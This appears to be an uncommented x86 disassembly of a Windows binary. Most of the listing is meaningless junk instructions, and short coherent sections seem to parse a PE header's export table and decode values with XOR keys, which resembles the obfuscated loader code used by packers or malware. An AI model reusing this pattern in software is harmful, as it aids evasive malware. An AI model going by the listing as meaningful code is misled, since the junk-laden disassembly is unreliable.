  40f1be:	mov    ds:0x20e94046,al
  40f1c3:	loop   0x40f182
  40f1c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1c6:	xor    BYTE PTR [edx],al
  40f1c8:	mov    al,ds:0xe05bed60
  40f1cd:	jp     0x40f19a
  40f1cf:	push   eax
  40f1d0:	mov    ecx,0x9d135d3
  40f1d5:	and    BYTE PTR [edx-0x6bd069a1],0x5f
  40f1dc:	mov    eax,ds:0x3d61296a
  40f1e1:	inc    esp
  40f1e2:	je     0x40f207
  40f1e4:	retf   
  40f1e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1e6:	stos   BYTE PTR es:[edi],al
  40f1e7:	push   ecx
  40f1e8:	jb     0x40f239
  40f1ea:	cwde   
  40f1eb:	xchg   edx,eax
  40f1ec:	cmp    eax,0x699984ad
  40f1f1:	pop    ebp
  40f1f2:	jns    0x40f17e
  40f1f4:	add    al,0xe4
  40f1f6:	in     eax,dx
  40f1f7:	out    dx,al
  40f1f8:	loope  0x40f1ae
  40f1fa:	mov    edi,DWORD PTR [ebx+0x12587852]
  40f200:	lds    ebx,FWORD PTR [edi]
  40f202:	mov    esp,0xfab84efa
  40f207:	xor    DWORD PTR [ecx-0x5a],0x26b4013
  40f20e:	out    dx,eax
  40f20f:	and    BYTE PTR [edx],al
  40f211:	push   0x45408844
  40f216:	sub    BYTE PTR [eax+ebx*4-0x48],dh
  40f21a:	pop    ecx
  40f21b:	sbb    eax,0xf39035ce
  40f220:	mov    ah,0x6f
  40f222:	neg    BYTE PTR [edx+0x267a269a]
  40f228:	and    ebx,ecx
  40f22a:	cs inc ecx
  40f22c:	jp     0x40f21d
  40f22e:	ins    BYTE PTR es:[edi],dx
  40f22f:	adc    dl,ah
  40f231:	(bad)  
  40f232:	sub    eax,0xab3368d9
  40f237:	bound  ecx,QWORD PTR [edi]
  40f239:	aaa    
  40f23a:	and    ah,BYTE PTR [ebx+eiz*2+0x5c]
  40f23e:	push   edi
  40f23f:	xchg   ch,dh
  40f241:	aas    
  40f242:	mov    bl,0x47
  40f244:	scas   eax,DWORD PTR es:[edi]
  40f245:	sahf   
  40f246:	les    cx,DWORD PTR [eax-0x33dee100]
  40f24d:	hlt    
  40f24e:	xor    DWORD PTR [esi],edi
  40f250:	add    bl,BYTE PTR [ebx-0x20]
  40f253:	pushf  
  40f254:	xchg   edx,eax
  40f255:	pop    ds
  40f256:	mov    edx,0xdaeedbed
  40f25b:	enter  0x7ef6,0x25
  40f25f:	(bad)  [edi-0x58ae489]
  40f265:	dec    esi
  40f266:	ret    
  40f267:	mov    esp,0xf9f2241f
  40f26c:	push   ebx
  40f26d:	jbe    0x40f229
  40f26f:	sbb    al,dh
  40f271:	pop    edx
  40f272:	sub    BYTE PTR [edx+0x1eb9e972],al
  40f278:	scas   eax,DWORD PTR es:[edi]
  40f279:	xchg   DWORD PTR [edx+0x4c],esi
  40f27c:	sbb    BYTE PTR [edi+0x73],0xae
  40f280:	lock jae 0x40f279
  40f283:	out    0xc9,al
  40f285:	in     al,dx
  40f286:	xor    al,BYTE PTR [edx*4+0x3b6668d7]
  40f28d:	cmp    ecx,DWORD PTR [edi+esi*4-0x79cbc367]
  40f294:	not    DWORD PTR [eax+ebp*8+0x7f9eb0cb]
  40f29b:	rcr    ah,cl
  40f29d:	(bad)
  40f2a0:	adc    eax,0x9c534ab8
  40f2a5:	add    dh,ch
  40f2a7:	or     DWORD PTR [esi+ebp*1+0x11],eax
  40f2ab:	and    BYTE PTR [eax],cl
  40f2ad:	or     al,ah
  40f2af:	push   ebx
  40f2b0:	or     DWORD PTR [edi],eax
  40f2b2:	fcmovnu st,st(5)
  40f2b4:	xchg   ebp,eax
  40f2b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2b6:	shr    DWORD PTR [esp+ebx*1+0x4d],1
  40f2ba:	dec    ecx
  40f2bb:	push   edi
  40f2bc:	jle    0x40f26e
  40f2be:	test   BYTE PTR [ecx],dl
  40f2c0:	aam    0xc9
  40f2c2:	lahf   
  40f2c3:	jp     0x40f331
  40f2c5:	cmp    bh,al
  40f2c7:	add    BYTE PTR [ecx-0x169fcbe2],cl
  40f2cd:	in     eax,0x4
  40f2cf:	add    BYTE PTR [eax],al
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	rol    BYTE PTR [ebp+edx*2-0x2c],1
  40f2fa:	pusha  
  40f2fb:	jbe    0x40f2a6
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f2a0
  40f304:	jmp    0xb4a1:0x2772a207
  40f30b:	fwait
  40f30c:	jbe    0x40f2d2
  40f30e:	test   BYTE PTR [eax-0x658e3b00],dl
  40f314:	out    dx,eax
  40f315:	inc    ebp
  40f316:	push   ecx
  40f317:	cmp    BYTE PTR [edx],ch
  40f319:	ja     0x40f2af
  40f31b:	dec    ebp
  40f31c:	xchg   edx,eax
  40f31d:	sub    al,0x1b
  40f31f:	adc    edx,DWORD PTR ds:0x948d5bf1
  40f325:	fisubr WORD PTR [eax+0x4a44c391]
  40f32b:	xor    eax,0x346f3f31
  40f330:	loopne 0x40f307
  40f332:	retf   0x67d3
  40f335:	and    ah,BYTE PTR [eax+0x5f34c1bb]
  40f33b:	pop    esp
  40f33c:	pushf  
  40f33d:	(bad)  
  40f33e:	loope  0x40f35f
  40f340:	jmp    0x46914339
  40f345:	(bad)  
  40f346:	call   0x7990:0x4f41063e
  40f34d:	sbb    eax,DWORD PTR [eax]
  40f34f:	out    dx,eax
  40f350:	push   0x684c9c22
  40f355:	jmp    0x40f351
  40f357:	out    0x4a,eax
  40f359:	hlt    
  40f35a:	add    al,0xe8
  40f35c:	jp     0x40f2f3
  40f35e:	inc    eax
  40f35f:	push   0x64
  40f361:	xchg   edx,eax
  40f362:	repz dec ecx
  40f364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f365:	(bad)  
  40f366:	dec    ebp
  40f367:	mov    eax,ds:0x5ee05ceb
  40f36c:	imul   esp,ebp,0xd40f64a2
  40f372:	add    BYTE PTR [edi-0x5],0xe4
  40f376:	call   0x970e:0xddf3fca4
  40f37d:	jb     0x40f3b4
  40f37f:	mov    bh,0xf9
  40f381:	sbb    ecx,ebx
  40f383:	test   BYTE PTR [eax],dh
  40f385:	mov    ebx,0xf58bcc0a
  40f38a:	sub    DWORD PTR [ecx-0x3fdf8649],esi
  40f390:	sub    DWORD PTR [esi-0x21],esp
  40f393:	lods   eax,DWORD PTR ds:[esi]
  40f394:	xor    eax,0x3e372af8
  40f399:	fs pop ebp
  40f39b:	in     al,0xee
  40f39d:	shl    BYTE PTR [edi+0x6a],0xc3
  40f3a1:	clc    
  40f3a2:	fistp  WORD PTR [ebp+edx*8+0x25f44d7]
  40f3a9:	sub    dl,al
  40f3ab:	xor    bh,0x16
  40f3ae:	push   eax
  40f3af:	jmp    0xf8ad:0x8fa3230c
  40f3b6:	(bad)  
  40f3b7:	imul   BYTE PTR [ebx+0x25]
  40f3ba:	jg     0x40f3ce
  40f3bc:	(bad)  
  40f3bd:	fdiv   st(6),st
  40f3bf:	(bad)  
  40f3c0:	or     BYTE PTR [ecx],bh
  40f3c2:	inc    BYTE PTR [esi]
  40f3c4:	sub    esp,DWORD PTR gs:[edi+0x3]
  40f3c8:	daa    
  40f3c9:	adc    ah,BYTE PTR [ecx+0x27]
  40f3cc:	stos   DWORD PTR es:[edi],eax
  40f3cd:	sbb    ch,ah
  40f3cf:	adc    edi,DWORD PTR [eax+edi*2]
  40f3d2:	popf   
  40f3d3:	sub    ch,bh
  40f3d5:	or     al,0x9e
  40f3d7:	pop    esi
  40f3d8:	cli    
  40f3d9:	cmp    DWORD PTR [esi],0x91c43ad3
  40f3df:	xchg   BYTE PTR [esi],bh
  40f3e1:	(bad)  
  40f3e2:	xchg   edi,eax
  40f3e3:	sbb    DWORD PTR [edx],edi
  40f3e5:	rcr    esi,cl
  40f3e7:	push   es
  40f3e8:	add    ecx,DWORD PTR [ebx+0x6f5044e8]
  40f3ee:	fiadd  WORD PTR [esi+ebp*8]
  40f3f1:	stc    
  40f3f2:	dec    ebx
  40f3f3:	out    0xd0,al
  40f3f5:	xchg   edi,eax
  40f3f6:	repnz clc 
  40f3f8:	ds scas al,BYTE PTR es:[di]
  40f3fb:	mov    dl,0x45
  40f3fd:	int    0xcd
  40f3ff:	push   DWORD PTR gs:[edx]
  40f402:	cmp    dh,0xd
  40f405:	mov    bh,0xb8
  40f407:	in     al,dx
  40f408:	loop   0x40f446
  40f40a:	or     BYTE PTR [eax],al
  40f40c:	aas    
  40f40d:	adc    ecx,esi
  40f40f:	mov    eax,0x28405cb
  40f414:	out    0x4c,al
  40f416:	popa   
  40f417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f418:	sbb    eax,0x5dc9060b
  40f41d:	pop    esi
  40f41e:	test   BYTE PTR [eax-0x23],ah
  40f421:	scas   al,BYTE PTR es:[edi]
  40f422:	inc    ecx
  40f423:	mov    ds:0xafda90de,eax
  40f428:	jmp    0x4ab23d60
  40f42d:	bound  ebp,QWORD PTR [ecx]
  40f42f:	scas   eax,DWORD PTR es:[edi]
  40f430:	std    
  40f431:	xchg   edx,eax
  40f432:	ret    0x92e6
  40f435:	sbb    BYTE PTR [edi-0x50],bl
  40f438:	xchg   DWORD PTR [ebx-0x7fff861e],eax
  40f43e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f43f:	or     edi,eax
  40f441:	retf   
  40f442:	mov    ebp,0x4a94a4a2
  40f447:	ss daa 
  40f449:	int3   
  40f44a:	(bad)  
  40f44b:	or     eax,0x8b867991
  40f451:	inc    ebp
  40f452:	clc    
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	jp     0x40f3fe
  40f466:	in     eax,0xe9
  40f468:	cmp    DWORD PTR [edi+0x7fc37070],esi
  40f46e:	jo     0x40f4e0
  40f470:	mov    ecx,0xe7da27ed
  40f475:	sub    eax,0x9c3805dd
  40f47a:	cld    
  40f47b:	xlat   BYTE PTR ds:[ebx]
  40f47c:	sbb    dh,dl
  40f47e:	cmp    eax,DWORD PTR [edi+0x50]
  40f481:	jle    0x40f4d8
  40f483:	adc    edx,eax
  40f485:	lods   al,BYTE PTR ds:[esi]
  40f486:	iret   
  40f487:	add    ebp,DWORD PTR ss:[ecx]
  40f48a:	push   esp
  40f48b:	loop   0x40f456
  40f48d:	test   dl,bh
  40f48f:	imul   eax,ebx,0x41
  40f492:	xchg   esi,eax
  40f493:	lods   al,BYTE PTR ds:[esi]
  40f494:	jge    0x40f484
  40f496:	adc    BYTE PTR [esi+eiz*1],bh
  40f499:	inc    esp
  40f49a:	jno    0x40f4e5
  40f49c:	sbb    edi,DWORD PTR [ebp+0x7]
  40f49f:	mov    DWORD PTR [esi+0x7a598f89],esp
  40f4a5:	fstp   QWORD PTR ds:0x91cda3e9
  40f4ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4ac:	jl     0x40f4c5
  40f4ae:	and    al,0x8a
  40f4b0:	fwait
  40f4b1:	adc    BYTE PTR ds:0x6f23e42f,al
  40f4b7:	icebp  
  40f4b8:	inc    ebp
  40f4b9:	lahf   
  40f4ba:	sub    eax,0xa6dbbce7
  40f4bf:	push   ds
  40f4c0:	call   0xb6373d8a
  40f4c5:	lea    eax,[esi-0x371ca8e7]
  40f4cb:	shl    BYTE PTR [ebp+0xe],cl
  40f4ce:	lahf   
  40f4cf:	push   0xbe5eac9b
  40f4d4:	(bad)
  40f4d8:	aas    
  40f4d9:	ficomp WORD PTR [esi+0x1c]
  40f4dc:	rol    BYTE PTR [ecx],1
  40f4de:	sub    DWORD PTR [edi+ebp*1+0x30f45838],ebp
  40f4e5:	mov    bh,0x48
  40f4e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4e8:	cmp    al,BYTE PTR [ecx]
  40f4ea:	mov    ebx,0x5d6d1e92
  40f4ef:	pop    edi
  40f4f0:	pop    esp
  40f4f1:	cmp    dl,BYTE PTR [ebx+eiz*4]
  40f4f4:	mov    ch,0xea
  40f4f6:	ja     0x40f501
  40f4f8:	and    cl,BYTE PTR [edi+0x24]
  40f4fb:	mov    bh,0x62
  40f4fd:	pop    eax
  40f4fe:	fcmovb st,st(1)
  40f500:	xor    ebp,ebp
  40f502:	mov    edx,gs
  40f504:	or     eax,0xf224eda2
  40f509:	xor    dx,WORD PTR es:[edx+0x4b]
  40f50e:	xor    esp,DWORD PTR [ebx]
  40f510:	pusha  
  40f511:	sub    ebx,DWORD PTR [eax-0x14]
  40f514:	mov    edx,DWORD PTR [eax+0x7]
  40f517:	mov    edx,DWORD PTR [ebx]
  40f519:	jl     0x40f4b4
  40f51b:	jl     0x40f544
  40f51d:	gs pop es
  40f51f:	jle    0x40f4d6
  40f521:	xor    eax,0xc001057d
  40f526:	add    BYTE PTR [ecx+0x26662fdc],dl
  40f52c:	ret    
  40f52d:	arpl   WORD PTR [esi-0x41],si
  40f530:	pop    edx
  40f531:	inc    eax
  40f532:	adc    ebx,esp
  40f534:	push   edi
  40f535:	xchg   edi,eax
  40f536:	scas   al,BYTE PTR es:[edi]
  40f537:	icebp  
  40f538:	test   al,0xd3
  40f53a:	scas   al,BYTE PTR es:[edi]
  40f53b:	xchg   edx,eax
  40f53c:	repz jg 0x40f558
  40f53f:	or     cl,bl
  40f541:	iret   
  40f542:	adc    DWORD PTR [edx-0x7e1df640],esi
  40f548:	mov    DWORD PTR [ebp+0x3a2ceb6d],esp
  40f54e:	adc    DWORD PTR [ebp+eiz*4-0x42267cdc],eax
  40f555:	mov    dl,0x62
  40f557:	cwde   
  40f558:	ins    DWORD PTR es:[edi],dx
  40f559:	sub    ch,dl
  40f55b:	sbb    BYTE PTR [eax-0x4e],0x48
  40f55f:	pop    edi
  40f560:	jno    0x40f596
  40f562:	ins    DWORD PTR es:[edi],dx
  40f563:	lock pop esp
  40f565:	push   DWORD PTR [edx]
  40f567:	sub    eax,0x6affb41b
  40f56c:	(bad)  
  40f56d:	mov    al,0x93
  40f56f:	xchg   esi,eax
  40f570:	aam    0x10
  40f572:	pop    ebp
  40f573:	mov    ?,WORD PTR [edx]
  40f575:	cmp    DWORD PTR [eax+ebp*2-0x77],ebp
  40f579:	lods   eax,DWORD PTR ds:[esi]
  40f57a:	scas   eax,DWORD PTR es:[edi]
  40f57b:	pushf  
  40f57c:	and    eax,0x18b906b1
  40f581:	scas   al,BYTE PTR es:[edi]
  40f582:	push   es
  40f583:	fisttp DWORD PTR [ecx]
  40f585:	push   ecx
  40f586:	jmp    0xa4907b8b
  40f58b:	inc    ebp
  40f58c:	xchg   DWORD PTR [eax-0x7ff686ab],esp
  40f592:	mov    edi,0xa2494eef
  40f597:	mov    ds,WORD PTR [eax+0x2a]
  40f59a:	in     eax,0x73
  40f59c:	jge    0x40f564
  40f59e:	dec    ecx
  40f59f:	mov    ah,0xff
  40f5a1:	push   ss
  40f5a2:	ficom  DWORD PTR [edi]
  40f5a4:	cmp    DWORD PTR [ebp+0x62026e8a],ecx
  40f5aa:	leave  
  40f5ab:	xor    al,0x8e
  40f5ad:	(bad)  
  40f5ae:	xor    ebx,edx
  40f5b0:	mov    ds:0x956ca754,eax
  40f5b5:	xchg   DWORD PTR [ecx+ebx*1-0x15],ebx
  40f5b9:	and    al,0x2
  40f5bb:	sar    esp,1
  40f5bd:	mov    eax,DWORD PTR [eax]
  40f5bf:	mov    eax,DWORD PTR [eax+0x3c]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	push   ecx
  40f604:	aaa    
  40f605:	sub    BYTE PTR [ebx],dh
  40f607:	mov    WORD PTR [esi+0x7fc37070],?
  40f60d:	jo     0x40f67f
  40f60f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f610:	mov    esp,ebp
  40f612:	sbb    BYTE PTR [edx+eiz*1+0x1b],dh
  40f616:	dec    ebp
  40f617:	mov    ds:0xda970581,al
  40f61c:	mov    al,ds:0xfa3fa0ee
  40f621:	pop    edx
  40f622:	pop    edi
  40f623:	inc    esi
  40f624:	inc    edx
  40f625:	fnstcw WORD PTR [ecx]
  40f627:	inc    edx
  40f628:	and    ch,BYTE PTR [ecx]
  40f62a:	lods   al,BYTE PTR gs:[esi]
  40f62c:	push   edx
  40f62d:	aam    0x62
  40f62f:	or     esi,DWORD PTR [esp+ecx*2-0x33e57eed]
  40f636:	fs xchg ebp,eax
  40f638:	icebp  
  40f639:	jo     0x40f676
  40f63b:	xor    DWORD PTR ss:[ebx+0x4f],eax
  40f63f:	es inc edi
  40f641:	pop    ecx
  40f642:	pop    ds
  40f643:	arpl   WORD PTR [esi],cx
  40f645:	jbe    0x40f5c7
  40f647:	das    
  40f648:	lock in eax,dx
  40f64a:	adc    edx,DWORD PTR [ecx]
  40f64c:	and    DWORD PTR [ebp+0x11b00f3f],eax
  40f652:	xchg   BYTE PTR [edi],bl
  40f654:	arpl   WORD PTR [esp+ecx*8+0x58cd0d1d],ax
  40f65b:	pop    ds
  40f65c:	es dec ebp
  40f65e:	jl     0x40f62c
  40f660:	jmp    0x458e7e8f
  40f665:	sbb    eax,0x994ac541
  40f66a:	daa    
  40f66b:	je     0x40f6d0
  40f66d:	test   eax,0xfa390a4b
  40f672:	mov    eax,0xa7271393
  40f677:	mov    ch,0xb0
  40f679:	cdq    
  40f67a:	xlat   BYTE PTR ds:[ebx]
  40f67b:	jg     0x40f6b0
  40f67d:	jl     0x40f68c
  40f67f:	rcr    DWORD PTR ds:0xd70a623c,0x46
  40f686:	xor    edi,DWORD PTR [ecx+0x7e46b5ba]
  40f68c:	mov    dh,0x2c
  40f68e:	(bad)  ds:0xaa0bacfa
  40f694:	sbb    al,0x67
  40f696:	mov    edi,0xd90f468a
  40f69b:	mov    eax,0x37a65679
  40f6a0:	test   al,0x4a
  40f6a2:	pop    ebp
  40f6a3:	sbb    esi,DWORD PTR [edx]
  40f6a5:	imul   eax,DWORD PTR [ebx],0x72
  40f6a8:	je     0x40f674
  40f6aa:	mov    ds:0x2efbe128,al
  40f6af:	push   ebx
  40f6b0:	mov    eax,0xcc2b6389
  40f6b5:	dec    ebx
  40f6b6:	dec    ebp
  40f6b7:	mov    al,ds:0x7828d1e6
  40f6bc:	and    eax,0xb85b82aa
  40f6c1:	xor    al,0x1c
  40f6c3:	cli    
  40f6c4:	in     eax,dx
  40f6c5:	xchg   BYTE PTR [esp+ecx*2],bl
  40f6c8:	push   edi
  40f6c9:	ret    
  40f6ca:	mov    WORD PTR [eax-0x6ab53d28],es
  40f6d0:	add    DWORD PTR [eax-0x34],edi
  40f6d3:	xchg   edi,eax
  40f6d4:	jge    0x40f6ca
  40f6d6:	jg     0x40f721
  40f6d8:	inc    DWORD PTR [ecx+esi*4+0x65]
  40f6dc:	mov    edi,0x9132f39e
  40f6e1:	imul   ebx,ebp,0xffffffba
  40f6e4:	or     eax,0x1d793236
  40f6e9:	dec    eax
  40f6ea:	test   BYTE PTR [ebx+0x7c],cl
  40f6ed:	jp     0x40f6ce
  40f6ef:	retf   
  40f6f0:	push   cs
  40f6f1:	prefetch BYTE PTR [esi+0x4e]
  40f6f5:	fs retf 0x64df
  40f6f9:	or     eax,0x5c81447
  40f6fe:	retf   0xb2f4
  40f701:	test   ah,dl
  40f703:	mov    ds:0x35c5c272,al
  40f708:	fsubr  QWORD PTR [ebx+0x3cea1862]
  40f70e:	or     eax,0xf349747d
  40f713:	dec    ebx
  40f714:	ror    BYTE PTR [edi],cl
  40f716:	repz push esp
  40f718:	and    dh,dh
  40f71a:	int3   
  40f71b:	ret    0x3e18
  40f71e:	outs   dx,BYTE PTR ds:[esi]
  40f71f:	(bad)  
  40f720:	mov    ecx,0xa24e2135
  40f725:	push   ds
  40f726:	push   0x44
  40f728:	scas   al,BYTE PTR es:[edi]
  40f729:	gs mov bl,0xf6
  40f72c:	ret    
  40f72d:	cld    
  40f72e:	fucomi st,st(3)
  40f730:	imul   ecx,DWORD PTR [edx],0xffffffa4
  40f733:	jp     0x40f6e7
  40f735:	aam    0x1e
  40f737:	cdq    
  40f738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f739:	sbb    DWORD PTR [ecx-0x5e],eax
  40f73c:	dec    esp
  40f73d:	out    0x78,al
  40f73f:	stos   DWORD PTR es:[edi],eax
  40f740:	cld    
  40f741:	jmp    0x40f7be
  40f743:	ret    0x7e4
  40f746:	mov    ds:0x3cffc485,eax
  40f74b:	(bad)  [esi]
  40f74d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f74e:	arpl   WORD PTR [edi+ebx*2],di
  40f751:	bound  eax,QWORD PTR [edx]
  40f753:	cld    
  40f754:	sbb    eax,0xd1225c5b
  40f759:	xor    eax,0x458b25e1
  40f75e:	clc    
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x822546f3
  40f7e3:	push   es
  40f7e4:	xchg   ebx,eax
  40f7e5:	pop    edi
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f842
  40f7ee:	jmp    0xf8a9:0x683c1921
  40f7f5:	mov    edi,0x75a3072e
  40f7fa:	lock hlt 
  40f7fc:	pop    DWORD PTR [edx]
  40f7fe:	and    bl,dl
  40f800:	push   0x3e70eb7b
  40f805:	mov    ah,0x8a
  40f807:	outs   dx,BYTE PTR ds:[esi]
  40f808:	and    al,0xfa
  40f80a:	mov    ds,WORD PTR [ebp+ecx*2+0x7]
  40f80e:	push   ss
  40f80f:	cmp    dh,BYTE PTR [esi+0x5f]
  40f812:	outs   dx,DWORD PTR ds:[esi]
  40f813:	ret    
  40f814:	jne    0x40f7ab
  40f816:	dec    eax
  40f817:	outs   dx,BYTE PTR ds:[esi]
  40f818:	shl    BYTE PTR [edi+ebp*2],cl
  40f81b:	sahf   
  40f81c:	les    ebx,FWORD PTR [ecx-0x13]
  40f81f:	cmc    
  40f820:	mov    bh,cl
  40f822:	inc    ebp
  40f823:	frstor [edx]
  40f825:	retf   0x1745
  40f828:	adc    BYTE PTR [edx-0x7e14fc3f],0xa1
  40f82f:	lods   al,BYTE PTR ds:[esi]
  40f830:	cmp    ch,BYTE PTR [eax-0x29]
  40f833:	outs   dx,BYTE PTR ds:[esi]
  40f834:	inc    esp
  40f835:	jmp    0xd93d:0xdb9236f1
  40f83c:	mov    ds:0x90c1f469,eax
  40f841:	sbb    dh,0x8e
  40f844:	jae    0x40f81e
  40f846:	loop   0x40f870
  40f848:	popa   
  40f849:	jne    0x40f808
  40f84b:	or     ecx,DWORD PTR [ebx-0x45]
  40f84e:	in     eax,0x46
  40f850:	inc    eax
  40f851:	mov    ebx,0xc4a9dc88
  40f856:	pop    ss
  40f857:	fs push ss
  40f859:	mov    al,ds:0xf68ea52a
  40f85e:	push   esi
  40f85f:	fst    st(6)
  40f861:	or     DWORD PTR [ecx-0x74ef102f],ebx
  40f867:	or     BYTE PTR [ebx-0x1327c31b],bh
  40f86d:	mov    DWORD PTR [ecx+0x35],0xfed14cb1
  40f874:	push   ds
  40f875:	sbb    bl,BYTE PTR [edi-0x16c9d669]
  40f87b:	xor    DWORD PTR [esi],0x15
  40f87e:	repz fldcw WORD PTR fs:[eax-0x54]
  40f883:	scas   al,BYTE PTR es:[edi]
  40f884:	or     esi,ebx
  40f886:	pop    ebp
  40f887:	xor    ch,ch
  40f889:	andps  xmm3,XMMWORD PTR [ebx-0xe2cfdee]
  40f890:	adc    ch,dh
  40f892:	fsubrp st(1),st
  40f894:	mov    esi,0x50c13dfb
  40f899:	dec    edi
  40f89a:	mov    cl,0x5b
  40f89c:	push   es
  40f89d:	push   edx
  40f89e:	out    dx,al
  40f89f:	and    eax,0x89ca489d
  40f8a4:	mov    ebx,0xf1be39ca
  40f8a9:	and    BYTE PTR [ecx-0x51],bl
  40f8ac:	ja     0x40f91e
  40f8ae:	cmp    DWORD PTR [ecx-0x604fc890],ebp
  40f8b4:	jns    0x40f871
  40f8b6:	mov    ?,edi
  40f8b8:	mov    dl,0x78
  40f8ba:	cmp    DWORD PTR [esi],0x94c13dcf
  40f8c0:	stos   DWORD PTR es:[edi],eax
  40f8c1:	es das 
  40f8c3:	(bad)  
  40f8c4:	fwait
  40f8c5:	(bad)  
  40f8c6:	fisubr WORD PTR [edi]
  40f8c8:	inc    ecx
  40f8c9:	cwde   
  40f8ca:	sub    al,0xa3
  40f8cc:	inc    ebp
  40f8cd:	add    DWORD PTR [esi-0x2b92ea50],eax
  40f8d3:	and    al,BYTE PTR [ecx-0x1ac576d9]
  40f8d9:	rol    BYTE PTR [edi],cl
  40f8db:	dec    edx
  40f8dc:	lods   eax,DWORD PTR ds:[esi]
  40f8dd:	inc    ebp
  40f8de:	pop    edi
  40f8df:	jecxz  0x40f95a
  40f8e1:	sbb    eax,0xd0945f9
  40f8e6:	test   BYTE PTR [ebp-0xa572568],0x3c
  40f8ed:	inc    esp
  40f8ee:	sahf   
  40f8ef:	fmul   DWORD PTR [ebx+ecx*1+0x71f5f8da]
  40f8f6:	cmp    dl,BYTE PTR [ecx-0x79]
  40f8f9:	(bad)  
  40f8fa:	ror    BYTE PTR [ebp+0x66],0xdb
  40f8fe:	shr    BYTE PTR [eax],1
  40f900:	hlt    
  40f901:	and    BYTE PTR [esi+0x77],dl
  40f904:	xchg   edi,eax
  40f905:	sub    al,0x4
  40f907:	repnz repnz mov ds:0xb53a3c6e,eax
  40f90e:	mov    BYTE PTR [edi],bh
  40f910:	cs pop ebp
  40f912:	or     al,0x52
  40f914:	mul    DWORD PTR [edx]
  40f916:	push   ebx
  40f917:	pop    esi
  40f918:	in     al,dx
  40f919:	mov    edx,0xbe2d607f
  40f91e:	popa   
  40f91f:	fld    TBYTE PTR [esi+0x5874938c]
  40f925:	cs inc ebp
  40f927:	add    edx,esp
  40f929:	xchg   BYTE PTR [edi+0x2b],bh
  40f92c:	push   ecx
  40f92d:	(bad)  
